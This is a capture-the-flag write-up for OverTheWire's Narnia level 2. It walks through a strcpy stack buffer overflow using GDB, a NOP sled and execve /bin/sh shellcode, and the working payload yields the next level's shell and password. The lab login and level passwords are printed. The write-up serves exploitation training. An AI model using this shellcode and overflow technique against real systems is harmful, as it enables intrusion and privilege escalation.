## Login 

` SSH : ssh narnia2@narnia.labs.overthewire.org -p 2226 `
` Pass : 5agRAXeBdG `

## Solution

First, let’s try to execute the program…

```
narnia2@narnia:~$ cd /narnia/
narnia2@narnia:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@narnia:/narnia$ ./narnia2 ABCD
ABCDnarnia2@narnia:/narnia$
```

So, this program just return the string we enter to the standard output.
### Source Code

Let’s check the source :

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

It looks like a standard _buffer overflow_ challenge. There is no size check in the _strcpy()_ function and the **buf** variable is only 128 bytes long. So, if we enter more chars than the size of the buffer, we should be able to break the execution flow by overwriting the return address.

Let’s do a quick check…

```
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print 140 * "A"')
Segmentation fault
```

Segfault ! Now, we’ll run the program in **GDB** to analyse this issue.

```
$ gdb narnia2

(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x0804844b <+0>:	push   ebp
   0x0804844c <+1>:	mov    ebp,esp
   0x0804844e <+3>:	add    esp,0xffffff80
   0x08048451 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048455 <+10>:	jne    0x8048471 <main+38>
   0x08048457 <+12>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845a <+15>:	mov    eax,DWORD PTR [eax]
   0x0804845c <+17>:	push   eax
   0x0804845d <+18>:	push   0x8048520
   0x08048462 <+23>:	call   0x8048300 <printf@plt>
   0x08048467 <+28>:	add    esp,0x8
   0x0804846a <+31>:	push   0x1
   0x0804846c <+33>:	call   0x8048320 <exit@plt>
   0x08048471 <+38>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048474 <+41>:	add    eax,0x4
   0x08048477 <+44>:	mov    eax,DWORD PTR [eax]
   0x08048479 <+46>:	push   eax
   0x0804847a <+47>:	lea    eax,[ebp-0x80]
   0x0804847d <+50>:	push   eax
   0x0804847e <+51>:	call   0x8048310 <strcpy@plt>
   0x08048483 <+56>:	add    esp,0x8
   0x08048486 <+59>:	lea    eax,[ebp-0x80]
   0x08048489 <+62>:	push   eax
   0x0804848a <+63>:	push   0x8048534
   0x0804848f <+68>:	call   0x8048300 <printf@plt>
   0x08048494 <+73>:	add    esp,0x8
   0x08048497 <+76>:	mov    eax,0x0
   0x0804849c <+81>:	leave
   0x0804849d <+82>:	ret
End of assembler dump.
(gdb) run $(python -c 'print 140 * "A"')
Starting program: /narnia/narnia2 $(python -c 'print 140 * "A"')

Breakpoint 1, 0x0804848f in main ()
(gdb) conti
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Now, we adjust our string size to precisely overwrite the return address.

```
(gdb) run $(python -c 'print 132 * "A" + "BBBB"')
Starting program: /narnia/narnia2 $(python -c 'print 132 * "A" + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

As you can see, we need 132 bytes of garbage and 4 more bytes to overwrite the retrun address. Now, we need a shellcode and a return address that will read our shellcode. I choose another shellcode from [ExploitDB](https://www.exploit-db.com/exploits/43716) :

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

To find the return address I placed a breakpoint right after the _strcpy()_ call :

```
(gdb) set disassembly-flavor intel
(gdb) break *main+68
Breakpoint 1 at 0x804848f
(gdb) run $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "BBBB"')
Starting program: /narnia/narnia2 $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "BBBB"')

Breakpoint 1, 0x0804848f in main ()
(gdb) x/100x $esp+500
0xffffd784:	0x000036b2	0x0000000e	0x000036b2	0x00000017
0xffffd794:	0x00000001	0x00000019	0xffffd7cb	0x0000001a
0xffffd7a4:	0x00000000	0x0000001f	0xffffdfe8	0x0000000f
0xffffd7b4:	0xffffd7db	0x00000000	0x00000000	0x00000000
0xffffd7c4:	0x00000000	0xa9000000	0x55fe0723	0x4a68d3c6
0xffffd7d4:	0xcc5d0b96	0x698947e8	0x00363836	0x00000000
0xffffd7e4:	0x00000000	0x00000000	0x616e2f00	0x61696e72
0xffffd7f4:	0x72616e2f	0x3261696e	0x90909000	0x90909090
0xffffd804:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd814:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd824:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd834:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd844:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd854:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd864:	0x50c03190	0x732f2f68	0x622f6868	0xe3896e69
0xffffd874:	0xc289c189	0x80cd0bb0	0xcd40c031	0x42424280
0xffffd884:	0x434c0042	0x4c4c415f	0x5f6e653d	0x552e5355
0xffffd894:	0x382d4654	0x5f534c00	0x4f4c4f43	0x723d5352
0xffffd8a4:	0x3a303d73	0x303d6964	0x34333b31	0x3d6e6c3a
0xffffd8b4:	0x333b3130	0x686d3a36	0x3a30303d	0x343d6970
0xffffd8c4:	0x33333b30	0x3d6f733a	0x333b3130	0x6f643a35
0xffffd8d4:	0x3b31303d	0x623a3533	0x30343d64	0x3b33333b
0xffffd8e4:	0x633a3130	0x30343d64	0x3b33333b	0x6f3a3130
0xffffd8f4:	0x30343d72	0x3b31333b	0x6d3a3130	0x30303d69
0xffffd904:	0x3d75733a	0x343b3733	0x67733a31	0x3b30333d
```

Here, I choose `0xffffd824` as it is in the middle of the _NOP-sled_. Let’s try again with the return address :

```
(gdb) run $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x24\xd8\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x24\xd8\xff\xff"')

Breakpoint 1, 0x0804848f in main ()
(gdb) continue
Continuing.
process 21195 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$
```

We got a shell, but we need to run it outside GDB’s context.

```
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print 104 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x24\xd8\xff\xff"')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
2xszzNl6uG
```

Yay, we did it !